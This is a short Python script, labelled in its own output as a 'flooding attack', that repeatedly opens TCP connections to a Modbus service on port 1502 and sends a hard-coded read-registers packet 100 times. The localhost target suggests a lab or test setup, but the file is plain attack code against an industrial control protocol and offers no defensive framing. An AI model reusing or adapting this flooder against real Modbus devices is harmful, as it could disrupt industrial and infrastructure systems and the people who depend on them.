import socket
import binascii

hex_packet = "00 10 00 00 00 06 01 03 00 10 00 01"
packet = binascii.unhexlify(hex_packet.replace(" ", ""))

print("[*] Starting flooding attack...")

for i in range(100):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("127.0.0.1", 1502))
    sock.sendall(packet + b"\r\n")
    sock.close()

print("[✓] Flooding attack completed")
